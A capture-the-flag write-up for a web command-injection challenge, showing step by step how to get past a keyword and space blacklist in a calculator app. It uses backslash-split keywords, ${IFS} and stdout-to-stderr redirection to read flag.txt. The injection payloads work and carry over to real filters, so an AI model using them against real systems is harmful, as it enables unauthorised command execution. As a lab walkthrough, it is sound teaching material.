# Writeup: Secure Calculator Challenge

## Challenge Overview
**Category:** Web / Command Injection
**Objective:** Read the content of `flag.txt`.


### 1. Initial Reconnaissance
The challenge provides a calculator interface.
- Inputting `1+1` gives `✅ CALCULATION PROCESSED. RESULT STORED IN SECURE MEMORY.`
- Inputting `5*5` gives the same message.
This indicates the application evaluates mathematical expressions, but **hides the standard output**.

### 2. Testing for Command Injection
We attempt to inject shell commands using common delimiters like `;`.
- Payload: `1; ls`
- Result: `✅ CALCULATION PROCESSED. RESULT STORED IN SECURE MEMORY.`

The application executes the command but **does not show the standard output (stdout)**. It claims the result is stored securely.

### 3. Identifying the Vulnerability (Blind vs. Error-Based)
Since we can't see stdout, we check if we can see **Standard Error (stderr)**.
- Payload: `1; command_that_does_not_exist`
- Result: `/bin/sh: 1: command_that_does_not_exist: not found`

Success! The application displays error messages. This means we can exfiltrate data by redirecting stdout to stderr.

### 4. Bypassing Filters
We try to read the flag directly.
- Payload: `1; cat flag.txt >&2`
- Result: `🚫 ILLEGAL INPUT DETECTED. INCIDENT REPORTED.`

The application has a blacklist filter. Through trial and error, we identify blocked terms:
- Spaces (` `)
- `cat`
- `flag`

### 5. Constructing the Bypass Payload

#### Bypassing Spaces
We can use input redirection `<` or the `${IFS}` environment variable.
- Instead of `cat flag.txt`, we can use `cat<flag.txt`.

#### Bypassing Keywords
We can insert backslashes `\` or empty quotes `''` inside keywords. The shell ignores them, but the web app's filter sees them as different strings.
- `cat` -> `c\at`
- `flag` -> `fl\ag`

### 6. The Final Payload
Combining everything:
1.  **Command:** `c\at` (Bypasses "cat")
2.  **Input:** `<fl\ag.txt` (Bypasses space and "flag")
3.  **Redirection:** `1>&2` (Redirects stdout to visible stderr)
4.  **Separator:** `${IFS}` (Needed before `1>&2` as a space separator)

**Payload:**
```bash
1;c\at<fl\ag.txt${IFS}1>&2;#
```

### 7. Execution
Entering the payload into the calculator reveals the flag in the error output box.

**Flag:** `l3mon{...}` (The actual flag content)
